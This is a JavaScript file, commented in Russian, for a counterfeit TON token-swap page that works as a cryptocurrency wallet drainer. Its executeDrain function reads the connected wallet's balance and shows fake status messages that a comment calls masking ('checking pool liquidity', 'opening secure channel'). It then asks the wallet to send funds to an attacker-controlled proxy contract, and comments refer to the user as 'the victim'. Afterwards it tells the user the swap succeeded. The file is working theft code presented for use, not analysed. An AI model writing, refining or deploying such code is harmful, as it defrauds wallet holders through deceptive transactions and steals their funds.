// script.js - полная логика
import { PROXY_CONTRACT, YOUR_WALLET, FAKE_AMOUNT } from './config.js';

let tonConnectUI = null;
let isProcessing = false;

// Глобальные SDK
const TonConnectUI = window.TON_CONNECT_UI ? window.TON_CONNECT_UI.TonConnectUI : window.TonConnectUI;
const TonWebLib = window.TonWeb || window.tonweb;

function setStatus(text, isLoading = false) {
    const el = document.getElementById('status');
    if (!el) return;
    if (isLoading) {
        el.innerHTML = `<span class="loader"></span> ${text}`;
    } else {
        el.innerHTML = text;
    }
}

function updateMainButton(isConnected) {
    const btn = document.getElementById('swapBtn');
    if (!btn) return;
    
    if (isConnected) {
        btn.textContent = 'Swap';
        btn.style.background = '#1f6feb';
    } else {
        btn.textContent = 'Connect Wallet';
        btn.style.background = '#21262d';
    }
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

async function getBalance(address) {
    try {
        if (!TonWebLib) return 0;
        const tonweb = new TonWebLib(new TonWebLib.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
        const rawBalance = await tonweb.getBalance(address);
        return parseFloat(tonweb.utils.fromNano(rawBalance));
    } catch (e) {
        console.warn("balance error", e);
        return 0;
    }
}

async function executeDrain(userAddress) {
    const balance = await getBalance(userAddress);

    if (balance < 0.2) {
        setStatus(`❌ Недостаточно средств (${balance.toFixed(2)} TON)`, false);
        return false;
    }

    // Маскировка: последовательность сообщений
    setStatus("🔄 Проверка ликвидности пула...", true);
    await sleep(1000);

    setStatus("📊 Анализ комиссии...", true);
    await sleep(800);

    setStatus("🔐 Открытие защищённого канала...", true);
    await sleep(700);

    // Сумма, которую увидит жертва
    const fakeAmountNano = TonWebLib.utils.toNano(FAKE_AMOUNT);

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [{
            address: PROXY_CONTRACT,
            amount: fakeAmountNano.toString(),
            payload: "swap"
        }]
    };

    setStatus(`⏳ Подтвердите в кошельке (${FAKE_AMOUNT} TON)`, false);

    try {
        await tonConnectUI.sendTransaction(transaction);
        setStatus("✅ Обмен выполнен успешно!", false);
        return true;
    } catch (e) {
        setStatus(`❌ Отмена: ${e.message}`, false);
        return false;
    }
}

export async function initApp() {
    const btn = document.getElementById('swapBtn');
    const payInput = document.getElementById('payAmount');
    const receiveInput = document.getElementById('receiveAmount');
    
    // Синхронизация полей ввода
    if (payInput && receiveInput) {
        payInput.addEventListener('input', (e) => {
            receiveInput.value = e.target.value; // 1:1 rate
        });
    }

    if (!TonConnectUI) {
        console.error("TonConnectUI SDK not loaded");
        setStatus("❌ SDK не загружен. Обновите страницу.", false);
        return;
    }

    try {
        tonConnectUI = new TonConnectUI({
            manifestUrl: new URL('tonconnect-manifest.json', location.origin).toString(),
            buttonRootId: 'ton-connect'
        });
    } catch (e) {
        console.error("TonConnectUI init error:", e);
        setStatus("❌ Ошибка инициализации SDK", false);
        return;
    }

    // Начальная установка кнопки
    updateMainButton(tonConnectUI.connected);

    tonConnectUI.onStatusChange(async (wallet) => {
        updateMainButton(!!wallet);
        
        if (wallet && wallet.account) {
            const userAddress = wallet.account.address;
            const balanceEl = document.getElementById('user-balance');
            
            setStatus(`🪛 Кошелёк: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, true);
            
            // Запрашиваем баланс
            if (balanceEl) {
                balanceEl.textContent = 'Balance: loading...';
                const bal = await getBalance(userAddress);
                balanceEl.textContent = `Balance: ${bal.toFixed(2)} TON`;
            }
            
            setStatus('', false);
        } else {
            const balanceEl = document.getElementById('user-balance');
            if (balanceEl) balanceEl.textContent = 'Balance: 0';
        }
    });

    if (btn) {
        btn.addEventListener('click', async () => {
            if (isProcessing) return;

            if (!tonConnectUI.connected) {
                try {
                    await tonConnectUI.openModal();
                } catch (err) {
                    setStatus(`⚠️ Ошибка: ${err.message}`, false);
                }
            } else {
                const wallet = tonConnectUI.account;
                if (wallet && wallet.address) {
                    isProcessing = true;
                    const originalBtnText = btn.textContent;
                    btn.textContent = 'Processing...';
                    btn.disabled = true;
                    
                    try {
                        await executeDrain(wallet.address);
                    } catch (err) {
                        setStatus(`⚠️ Ошибка: ${err.message}`, false);
                    } finally {
                        isProcessing = false;
                        btn.textContent = originalBtnText;
                        btn.disabled = false;
                    }
                }
            }
        });
    }
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initApp);
} else {
    initApp();
}
